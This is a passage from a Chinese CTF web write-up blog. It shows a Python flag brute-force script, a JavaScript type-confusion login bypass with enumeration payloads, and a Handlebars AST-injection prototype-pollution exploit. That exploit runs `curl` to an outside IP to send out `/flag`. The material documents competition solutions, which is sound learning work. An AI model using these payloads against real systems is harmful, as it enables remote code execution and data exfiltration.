  <span class="keyword">if</span> (<span class="variable">$Answer</span> == <span class="title function_ invoke__">substr</span>(<span class="variable">$result</span>,<span class="number">0</span>,<span class="title function_ invoke__">strlen</span>(<span class="variable">$Answer</span>)))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;wow~&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;no~&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;no~&quot;</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>上脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url =<span class="string">&quot;http://47.120.0.245/fuck.php&quot;</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">40</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>,<span class="number">127</span>):  </span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        header=&#123;</span><br><span class="line">        <span class="string">&quot;seed&quot;</span>:<span class="string">&quot;1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;answer&quot;</span>:flag+<span class="string">&quot;&#123;0&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">chr</span>(i))</span><br><span class="line">        &#125;</span><br><span class="line">        pro=&#123;<span class="string">&quot;http&quot;</span>:<span class="string">&quot;127.0.0.1:8080&quot;</span>&#125;</span><br><span class="line">        re=requests.get(url=url, headers=header,proxies=pro)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;wow~&quot;</span> <span class="keyword">in</span> re.text:</span><br><span class="line">            flag+=<span class="built_in">chr</span>(i)</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span> </span><br><span class="line">        </span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$seed</span>=<span class="string">&quot;1&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="variable">$seed</span>);</span><br><span class="line"><span class="variable">$flag</span>=<span class="string">&quot;hnbh&#125;jgtg`ju`CubM3o~&quot;</span>;</span><br><span class="line"><span class="variable">$flag</span> = <span class="title function_ invoke__">str_split</span>(<span class="variable">$flag</span>);</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$flag</span> <span class="keyword">as</span> <span class="variable">$value</span>)&#123;</span><br><span class="line">    <span class="variable">$result</span> = <span class="variable">$result</span> . <span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="variable">$value</span>)-<span class="title function_ invoke__">mt_rand</span>(<span class="number">1</span>,<span class="number">2</span>));</span><br><span class="line">    <span class="variable">$a</span>=<span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="30-2023-香山杯初赛-meow-blog"><a href="#30-2023-香山杯初赛-meow-blog" class="headerlink" title="30[2023]香山杯初赛 meow_blog"></a>30[2023]香山杯初赛 meow_blog</h2><blockquote>
<p>首先，给了源码</p>
</blockquote>
<h3 id="1-js身份伪造"><a href="#1-js身份伪造" class="headerlink" title="1.js身份伪造"></a>1.js身份伪造</h3><blockquote>
<p>这里的身份伪造没有任何作用，同时还误导了我去看了一天的style，不过是个知识点，记一下</p>
</blockquote>
<p>查看源码身份验证的部分</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">login</span>: <span class="keyword">async</span> (req, res, next) =&gt; &#123;</span><br><span class="line">      <span class="keyword">let</span> conn = <span class="literal">null</span>;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">          <span class="keyword">if</span> (req.<span class="property">session</span>.<span class="property">user</span>) &#123;</span><br><span class="line">              <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">const</span> username = req.<span class="property">data</span>.<span class="property">username</span>;</span><br><span class="line">          <span class="keyword">const</span> password = req.<span class="property">data</span>.<span class="property">password</span>;</span><br><span class="line">          <span class="keyword">if</span> (!username || !password) &#123;</span><br><span class="line">              <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">401</span>).<span class="title function_">render</span>(<span class="string">&#x27;login&#x27;</span>, &#123; <span class="attr">message</span>: <span class="string">&#x27;Field can\&#x27;t be empty.&#x27;</span> &#125;);</span><br><span class="line">          &#125;</span><br><span class="line">          conn = pool.<span class="title function_">promise</span>();</span><br><span class="line">          <span class="keyword">const</span> [formerUserRows] = <span class="keyword">await</span> conn.<span class="title function_">query</span>(<span class="string">&#x27;SELECT * FROM users WHERE username = ? AND password = ?&#x27;</span>, [username, password])</span><br><span class="line">          <span class="keyword">if</span> (formerUserRows.<span class="property">length</span> === <span class="number">0</span>) &#123;</span><br><span class="line">              <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">401</span>).<span class="title function_">render</span>(<span class="string">&#x27;login&#x27;</span>, &#123; <span class="attr">message</span>: <span class="string">&#x27;Username or password error.&#x27;</span> &#125;);</span><br><span class="line">          &#125;</span><br><span class="line">          req.<span class="property">session</span>.<span class="property">user</span> = &#123;</span><br><span class="line">              <span class="attr">username</span>: username,</span><br><span class="line">              <span class="attr">id</span>: formerUserRows[<span class="number">0</span>].<span class="property">id</span>,</span><br><span class="line">              <span class="attr">style</span>: formerUserRows[<span class="number">0</span>].<span class="property">style</span></span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">      &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">          <span class="title function_">next</span>(err);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;,</span><br></pre></td></tr></table></figure>

<p>由于js是一种弱类型的语言，这里可与直接绕过登录</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;username&quot;</span>:<span class="string">&quot;admim&quot;</span>,<span class="string">&quot;password&quot;</span>:&#123;<span class="string">&quot;password&quot;</span>:<span class="literal">true</span>&#125;&#125;</span><br><span class="line"><span class="comment">//这里将传入的值作为对象处理，直接绕过</span></span><br><span class="line">&#123;“user”:[<span class="number">0</span>],“passwd”:[<span class="number">0</span>]&#125;</span><br><span class="line">username=admin&amp;password[password]=<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>对于mysql，如果js传入的是一个空数组，会出现这样的报错</p>
<blockquote>
<p>User with login [] was not found</p>
</blockquote>
<p>这里将数组直接转换成字符串加入道查询里面了</p>
<p>如果传入一个空对象{}</p>
<p>他会直接去寻找val.raplace这个函数，找不到返回报错</p>
<h4 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h4><p>1.枚举用户</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;username&quot;:[0,1,2,30,50,100],&quot;password&quot;:&quot;secretpassword&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>这里会报错，就可以探测存在的用户了</p>
<p>2.绕过密码</p>
<blockquote>
<p>{“username”:[0],”password”:true}</p>
</blockquote>
<p>查询的时候用0 的身份和true的密码登录了</p>
<h3 id="2-AST注入"><a href="#2-AST注入" class="headerlink" title="2.AST注入"></a>2.AST注入</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import json</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">payload = &quot;&quot;&quot;</span><br><span class="line">&#123;</span><br><span class="line">&quot;evil&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;type&quot;: &quot;Program&quot;,&quot;body&quot;: [&#123;</span><br><span class="line">        &quot;type&quot;: &quot;MustacheStatement&quot;,</span><br><span class="line">        &quot;path&quot;: 0,</span><br><span class="line">        &quot;params&quot;: [&#123;</span><br><span class="line">            &quot;type&quot;: &quot;NumberLiteral&quot;,</span><br><span class="line">            &quot;value&quot;: &quot;process.mainModule.require(&#x27;child_process&#x27;).execSync(`curl http://1.12.48.9:8081/$(cat /flag)`)&quot;</span><br><span class="line">        &#125;],</span><br><span class="line">        &quot;loc&quot;: &#123;</span><br><span class="line">            &quot;start&quot;: 0,</span><br><span class="line">            &quot;end&quot;: 0</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;]</span><br><span class="line">    &#125;&#125;&#125;</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">url = &quot;http://59.110.125.41:34381&quot;</span><br><span class="line">requests.post(url + &quot;/clearposts&quot;, json=json.loads(payload))</span><br></pre></td></tr></table></figure>

<p>打就好了</p>
</article><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="/img/head.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/10/18/2023%20%E6%9F%8F%E9%B9%AD%E6%9D%AF/" title="2023 柏鹭杯"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">Previous</div><div class="prev_info">2023 柏鹭杯</div></div></a></div><div class="next-post pull-right"><a href="/2023/10/12/%E9%80%83%E9%80%B8/" title="逃逸"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">Next</div><div class="next_info">逃逸</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/head.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">AsaL1n</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">19</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/AsaL1n"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">why we need that??</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%EF%BC%89"><span class="toc-number">1.</span> <span class="toc-text">刷题记录（持续更新）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-NSSRound-13-Basic-flask-jwt"><span class="toc-number">1.1.</span> <span class="toc-text">1.[NSSRound#13 Basic]flask?jwt?</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#flask%E7%9A%84%E4%BD%BF%E7%94%A8%E5%92%8C%E6%8A%A5%E9%94%99%E8%A7%A3%E5%86%B3%EF%BC%88%E5%B8%AD%E5%85%AB%EF%BC%89"><span class="toc-number">1.1.1.</span> <span class="toc-text">flask的使用和报错解决（席八）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-NSSRound-13-Basic-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.2.</span> <span class="toc-text">2.[NSSRound#13 Basic]信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2023-25690-Apache-HTTP-Server-%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.2.1.</span> <span class="toc-text">CVE-2023-25690 Apache HTTP Server 请求走私漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#http%E8%B5%B0%E7%A7%81"><span class="toc-number">1.2.2.</span> <span class="toc-text">http走私</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-NSSRound-13-Basic-ez-factors"><span class="toc-number">1.3.</span> <span class="toc-text">3.[NSSRound#13 Basic]ez_factors</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%B9%E8%B7%AF%E7%94%B1%E7%9A%84%E7%A0%B4%E5%9D%8F%E5%92%8C%E7%BB%95%E8%BF%87"><span class="toc-number">1.3.1.</span> <span class="toc-text">&#x2F;对路由的破坏和绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell%E5%B0%8F%E5%B0%8F%E6%80%BB%E7%BB%93"><span class="toc-number">1.3.2.</span> <span class="toc-text">反弹shell小小总结</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#od%E7%94%A8%E6%B3%95"><span class="toc-number">1.3.3.</span> <span class="toc-text">od用法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-MoeCTF-2022-ezphp"><span class="toc-number">1.4.</span> <span class="toc-text">4.[MoeCTF 2022]ezphp</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#foreach%E5%87%BD%E6%95%B0-foreach-VAR-LIST-TEXT"><span class="toc-number">1.4.1.</span> <span class="toc-text">foreach函数               $(foreach VAR,LIST,TEXT)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-NSSCTFRound-7-O0O"><span class="toc-number">1.5.</span> <span class="toc-text">5.NSSCTFRound#7 O0O</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#DS-Store%E6%B3%84%E9%9C%B2"><span class="toc-number">1.5.1.</span> <span class="toc-text">.DS_Store泄露</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#00%E6%88%AA%E6%96%AD"><span class="toc-number">1.5.2.</span> <span class="toc-text">%00截断</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-HNCTF-2022-WEEK3-ssssti"><span class="toc-number">1.6.</span> <span class="toc-text">6.[HNCTF 2022 WEEK3]ssssti</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-HNCTF-2022-WEEK2-Canyource"><span class="toc-number">1.7.</span> <span class="toc-text">7.[HNCTF 2022 WEEK2]Canyource</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8-NCTF-2019-Fake-XML-cookbook"><span class="toc-number">1.8.</span> <span class="toc-text">8.[NCTF 2019]Fake XML cookbook</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#9-CISCN-2019%E5%8D%8E%E5%8C%97Day1-Web1"><span class="toc-number">1.9.</span> <span class="toc-text">9[CISCN 2019华北Day1]Web1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD"><span class="toc-number">1.9.1.</span> <span class="toc-text">任意文件下载</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#10-%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-easyphp"><span class="toc-number">1.10.</span> <span class="toc-text">10.[羊城杯 2020]easyphp</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#php-value-auto-append-file"><span class="toc-number">1.10.1.</span> <span class="toc-text">php_value auto_append_file</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#UUCTF-ezpop"><span class="toc-number">1.11.</span> <span class="toc-text">[UUCTF]ezpop</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8"><span class="toc-number">1.12.</span> <span class="toc-text">php反序列化字符串逃逸</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#11-DASCTF-2023-ezweb"><span class="toc-number">1.13.</span> <span class="toc-text">11.DASCTF 2023 ezweb</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93"><span class="toc-number">1.14.</span> <span class="toc-text">python原型链污染</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#12-CSAWQual-2019-Unagi%E7%9C%8Bxxe%E5%90%84%E7%A7%8D%E7%BB%95%E8%BF%87"><span class="toc-number">1.15.</span> <span class="toc-text">12[CSAWQual 2019]Unagi看xxe各种绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xxe%E7%9A%84%E5%90%84%E7%A7%8D%E7%BB%95%E8%BF%87"><span class="toc-number">1.16.</span> <span class="toc-text">xxe的各种绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#13-NCTF-2018-Easy-Audit"><span class="toc-number">1.17.</span> <span class="toc-text">13[NCTF 2018]Easy_Audit</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#REQUEST%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96"><span class="toc-number">1.17.1.</span> <span class="toc-text">_REQUEST变量覆盖</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SERVER-%E2%80%98QUERY-STRING%E2%80%99-%E7%BB%95%E8%BF%87"><span class="toc-number">1.17.2.</span> <span class="toc-text">$_SERVER[‘QUERY_STRING’]绕过</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#14-CISCN-2022%E5%88%9D%E8%B5%9B-online-crt"><span class="toc-number">1.18.</span> <span class="toc-text">14.[CISCN 2022初赛] online_crt</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#url%E6%B3%A8%E5%85%A5http%E5%A4%B4"><span class="toc-number">1.18.1.</span> <span class="toc-text">url注入http头</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#go%E7%9A%84RawPath%E7%89%B9%E6%80%A7"><span class="toc-number">1.18.2.</span> <span class="toc-text">go的RawPath特性</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#c-rehash%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-C-VE-2022-1292"><span class="toc-number">1.18.3.</span> <span class="toc-text">c_rehash命令执行       C VE-2022-1292</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#15-nepctf2023-ez-java-checkin"><span class="toc-number">1.19.</span> <span class="toc-text">15.[nepctf2023]ez_java_checkin</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2016-4437"><span class="toc-number">1.19.1.</span> <span class="toc-text">CVE-2016-4437</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#16-nepctf2023-%E7%8B%AC%E6%AD%A5%E5%A4%A9%E4%B8%8B-%E8%BD%AC%E7%94%9F%E6%88%90%E4%B8%BA%E9%95%9C%E8%8A%B1%E6%B0%B4%E6%9C%88%E4%B8%AD%E7%9A%84%E7%8E%8B%E8%80%85"><span class="toc-number">1.20.</span> <span class="toc-text">16.[nepctf2023]独步天下-转生成为镜花水月中的王者</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%B3%A8%E5%85%A5"><span class="toc-number">1.20.1.</span> <span class="toc-text">环境注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#17-NCTF-2018-%E5%85%A8%E7%90%83%E6%9C%80%E5%A4%A7%E4%BA%A4%E5%8F%8B%E7%BD%91%E7%AB%99"><span class="toc-number">1.21.</span> <span class="toc-text">17.[NCTF 2018]全球最大交友网站</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#18-%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy-web"><span class="toc-number">1.22.</span> <span class="toc-text">18.[安洵杯 2019]easy_web</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#19-%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4-2023-png%E5%9B%BE%E7%89%87%E8%BD%AC%E6%8D%A2%E5%99%A8"><span class="toc-number">1.23.</span> <span class="toc-text">19.[第五空间]2023 png图片转换器</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ruby-file-open%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.23.1.</span> <span class="toc-text">ruby file.open漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%A8linux%E9%87%8C%E9%9D%A2-%E7%9A%84%E4%BD%9C%E7%94%A8"><span class="toc-number">1.23.2.</span> <span class="toc-text">在linux里面&#96;&#96;的作用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#20-pop%E5%AD%90%E5%92%8Cpipi%E7%BE%8E"><span class="toc-number">1.24.</span> <span class="toc-text">20.pop子和pipi美</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96%E5%8F%AF%E4%BB%A5%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8D%E5%AD%98%E5%9C%A8%E7%9A%84%E6%88%90%E5%91%98"><span class="toc-number">1.24.1.</span> <span class="toc-text">序列化可以序列化不存在的成员</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#21-%E8%93%9D%E5%B8%BD%E6%9D%AF2023%E5%88%9D%E8%B5%9B-funny-php"><span class="toc-number">1.25.</span> <span class="toc-text">21.蓝帽杯2023初赛 funny_php</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#php%E5%AF%B9%E9%9D%9E%E6%B3%95%E5%8F%98%E9%87%8F%E5%90%8D%E5%AD%97%E7%9A%84%E5%A4%84%E7%90%86"><span class="toc-number">1.25.1.</span> <span class="toc-text">php对非法变量名字的处理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87wakeup%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93"><span class="toc-number">1.25.2.</span> <span class="toc-text">绕过wakeup方法总结</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-cve-2016-7124"><span class="toc-number">1.25.2.1.</span> <span class="toc-text">1.cve-2016-7124</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-php-issue-9618v"><span class="toc-number">1.25.2.2.</span> <span class="toc-text">2.php issue#9618v</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E5%9B%9E%E6%98%BEfile%E5%87%BD%E6%95%B0%E7%9A%84%E6%96%B0%E6%80%9D%E8%B7%AF"><span class="toc-number">1.25.3.</span> <span class="toc-text">无回显file函数的新思路</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-filter-chain%E9%80%A0%E6%88%90rce"><span class="toc-number">1.25.3.1.</span> <span class="toc-text">1.filter-chain造成rce</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E4%BE%A7%E4%BF%A1%E9%81%93%E6%94%BB%E5%87%BB"><span class="toc-number">1.25.3.2.</span> <span class="toc-text">2.侧信道攻击</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#22-CISCN-2023-%E5%88%9D%E8%B5%9B-go-session-%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.26.</span> <span class="toc-text">22.[CISCN 2023 初赛]go_session(复现)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BC%AA%E9%80%A0session%E6%8F%90%E6%9D%83%E4%B8%BAadmin"><span class="toc-number">1.26.1.</span> <span class="toc-text">伪造session提权为admin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ssti%E6%B3%A8%E5%85%A5"><span class="toc-number">1.26.2.</span> <span class="toc-text">ssti注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flask%E7%83%AD%E8%B0%83%E8%AF%95"><span class="toc-number">1.26.3.</span> <span class="toc-text">flask热调试</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#23-%E7%BE%8A%E5%9F%8E%E6%9D%AF%E5%86%B3%E8%B5%9Bweb3"><span class="toc-number">1.27.</span> <span class="toc-text">23.羊城杯决赛web3</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#php%E7%9A%84session%E5%82%A8%E5%AD%98%E6%9C%BA%E5%88%B6"><span class="toc-number">1.27.0.1.</span> <span class="toc-text">php的session储存机制</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#24-%E5%AF%B9%E5%86%85%E8%B5%9B-escape-plan"><span class="toc-number">1.28.</span> <span class="toc-text">24.对内赛 escape plan</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#25-%E5%AF%B9%E5%86%85%E8%B5%9B-ezcms"><span class="toc-number">1.29.</span> <span class="toc-text">25.对内赛 ezcms</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#26-%E5%AF%B9%E5%86%85%E8%B5%9B-easyjs"><span class="toc-number">1.30.</span> <span class="toc-text">26.对内赛 easyjs</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CRLF"><span class="toc-number">1.31.</span> <span class="toc-text">CRLF</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#js%E7%9A%84%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E%E8%87%AA%E5%8A%A8%E5%AE%A1%E8%AE%A1"><span class="toc-number">1.32.</span> <span class="toc-text">js的组件漏洞自动审计</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Redis%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E6%BC%8F%E6%B4%9E-RCE"><span class="toc-number">1.33.</span> <span class="toc-text">Redis沙盒逃逸漏洞 RCE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#27-%E7%BE%8A%E5%9F%8E%E6%9D%AF2023%E5%86%B3%E8%B5%9B-web4"><span class="toc-number">1.34.</span> <span class="toc-text">27.羊城杯2023决赛 web4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#28-%E7%BE%8A%E5%9F%8E%E6%9D%AF2023%E5%86%B3%E8%B5%9B-web5"><span class="toc-number">1.35.</span> <span class="toc-text">28.羊城杯2023决赛 web5</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#WeasyPrint%E5%AF%BC%E8%87%B4%E7%9A%84ssrf%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.35.1.</span> <span class="toc-text">WeasyPrint导致的ssrf漏洞</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#29-%E5%8F%B0%E5%B7%9E%E5%B8%82%E8%B5%9B%E5%88%9D%E8%B5%9B-ezphp2"><span class="toc-number">1.36.</span> <span 